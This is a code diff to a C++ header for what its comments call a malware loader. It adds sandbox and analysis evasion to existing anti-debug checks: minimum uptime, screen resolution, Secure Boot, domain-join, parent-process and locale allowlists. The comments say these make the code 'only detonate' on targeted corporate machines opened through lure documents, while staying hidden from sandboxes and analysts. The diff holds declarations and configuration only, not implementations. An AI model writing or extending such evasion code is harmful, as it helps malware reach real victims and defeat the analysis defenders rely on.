@@ -50,6 +50,45 @@ struct GuardrailConfig {
     bool check_debugger_processes;       // Check for known debugger processes
     bool check_hardware_breakpoints;     // Check hardware breakpoints in debug registers
     bool check_timing_checks;            // Perform timing-based detection
+
+    // Anti-sandbox/VM checks
+    bool check_sandbox_environment;      // Check for VM/sandbox indicators
+
+    // Uptime check: refuse to run if system uptime is below the threshold.
+    // Fresh sandboxes almost always have near-zero uptime; a real user workstation
+    // has been running for hours. Default threshold is 300 seconds (5 minutes).
+    bool check_uptime;
+    DWORD uptime_min_seconds;            // Minimum uptime in seconds (default 300)
+
+    // Screen resolution check: sandboxes and analyst VMs often use low-res
+    // virtual displays (800x600, 1024x768). Require at least 1280x1024.
+    bool check_screen_resolution;
+
+    // Secure Boot check: modern corporate endpoints have Secure Boot enabled.
+    // Sandbox VMs and analyst machines often disable it for flexibility.
+    bool check_secure_boot;
+
+    // Domain-join check: only detonate on machines joined to a Windows
+    // domain. Cheap (one NetGetJoinInformation call), highly effective
+    // against standalone sandboxes and analyst workstations that rarely
+    // mirror the target's AD topology.
+    bool check_domain_joined;
+
+    // Parent process allowlist: only detonate when our parent image name
+    // matches one of these (case-insensitive, no path). Catches sandbox
+    // runners that spawn samples from rundll32/cmd/python/analyzer.exe
+    // rather than the expected lure context (explorer, winword, etc.).
+    // Leave allowed_parents=nullptr to skip.
+    const char** allowed_parents;
+    int parent_count_allowed;
+
+    // Locale / keyboard-layout allowlist. Pass a list of Windows LCID
+    // hex strings (e.g. "0409" for en-US, "0411" for ja-JP). If non-null
+    // and non-empty, the loader only detonates when GetUserDefaultLCID()
+    // or any loaded keyboard layout matches one of the entries. Empty
+    // list or nullptr = skip check.
+    const char** allowed_locales;
+    int locale_count_allowed;
 };
 
 /**
@@ -81,6 +120,13 @@ CheckResult CheckRemoteDebugger();
 CheckResult CheckDebuggerProcesses();
 CheckResult CheckHardwareBreakpoints();
 CheckResult CheckTimingAnomaly();
+CheckResult CheckSandboxEnvironment();
+CheckResult CheckUptime(DWORD min_seconds);
+CheckResult CheckScreenResolution();
+CheckResult CheckSecureBoot();
+CheckResult CheckDomainJoined();
+CheckResult CheckParentProcess(const char** allowed, int allowed_count);
+CheckResult CheckLocale(const char** allowed, int allowed_count);
 
 // Helper functions
 bool CheckIfDebugged();                  // Master anti-debug check (runs all enabled checks)
